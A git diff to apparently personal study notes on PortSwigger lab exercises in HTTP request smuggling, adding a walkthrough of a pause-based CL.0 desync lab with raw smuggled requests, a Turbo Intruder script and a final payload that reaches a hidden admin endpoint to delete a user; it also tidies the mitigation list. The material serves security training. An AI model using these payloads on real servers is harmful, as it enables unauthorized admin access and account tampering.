@@ -4062,10 +4062,10 @@ Response: Communication timed out. (chunked size is 5)
     ```
 
 **Mitigation**
+- Use HTTP/2 end to end and disable HTTP downgrading  
 - Interpret HTTP headers consistently on front-end and back-end servers
 - Disable vulnerable optimizations such as Transfer-Encoding or Content-Length header
 - Avoid use of load balancers, content delivery networks (CDNs), or reverse proxies if not required in your setup
-- Use HTTP/
 - Disable connection reuse on the back-end server
 - Configure the front-end server to normalize ambiguous requests
 
@@ -4081,10 +4081,6 @@ Response: Communication timed out. (chunked size is 5)
   ![CL.TE vulnerabilities](img/chunked%20size%20-%20TE%20-%20variable.png)
 - chunked size TE end with 0
   ![CL.TE vulnerabilities](img/chunked%20size%20-%20TE%20-%200.png)
-
-**How to calcualte content length**
-- dd
-- dd
 
 ### HTTP request smuggling Lab
 - HTTP request smuggling, basic CL.TE vulnerability
@@ -4721,9 +4717,63 @@ Response: Communication timed out. (chunked size is 5)
     GET /myaccount
     cookie: <stolen cookie>
     ```
-- dd
-- dd
+- Server-side **pause-based request smuggling (Expert)**
+  - Info: This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints. To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at /admin, then delete the user carlos. 
+  - https://www.youtube.com/watch?v=AqxKrADAJOE
+  - Identify a desync vector
+    - GET /resources/images/avatarDefault.svg > send repeater > change request method to POST + HTTP 1.1 
+    - GET /resources redirect back to /resources
+    - Right click request > extensions > turbo intruder > send to turnbo intruder
+    - turbo request: connection: keep-alive > add a GET /admin
+      ```
+      POST /resources HTTP/1.1
+      Host: YOUR-LAB-ID.web-security-academy.net
+      Cookie: session=YOUR-SESSION-COOKIE
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: CORRECT
 
+      GET /admin/ HTTP/1.1
+      Host: localhost\n\n
+      ```
+    - python editor panel
+      ```
+      def queueRequests(target, wordlists):
+	    engine = RequestEngine(endpoint=target.endpoint,
+	                           concurrentConnections=1,
+	                           requestsPerConnection=500,
+	                           pipeline=False
+	                           )
+	
+	    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+	    engine.queue(target.req)
+	
+	def handleResponse(req, interesting):
+	    table.add(req)
+      ```
+   - after 61 seconds > first entry "POST /resources" redirect to /resources; Second entry resposne to "GET /admin/"
+     Response
+     ```
+     <input required type="hidden" name="csrf" value="unJUcg4FMeQSEsaCfeJV4utX3m3KEFM3">
+     ```
+  - Exploit (Use repeater to calculate the content length of body 'csrf=xx.....')
+    ```
+    POST /resources HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: CORRECT (159)
+
+    POST /admin/delete/ HTTP/1.1
+    Host: localhost\n\n
+    Content-Type: x-www-form-urlencoded
+    Content-Length: CORRECT (53)
+
+    csrf=YOUR-CSRF-TOKEN&username=carlos
+    ```
+ - To prevent Turbo Intruder from pausing after both occurrences of \r\n\r\n in the request, update the pauseMarker argument so that it only matches the end of the first set of headers
+   `pauseMarker=['Content-Length: CORRECT(159)\r\n\r\n']` or `pauseMarker=['\r\n\r\nPOST']`
 
 ## OAuth Authentication
 Content for OAuth Authentication...
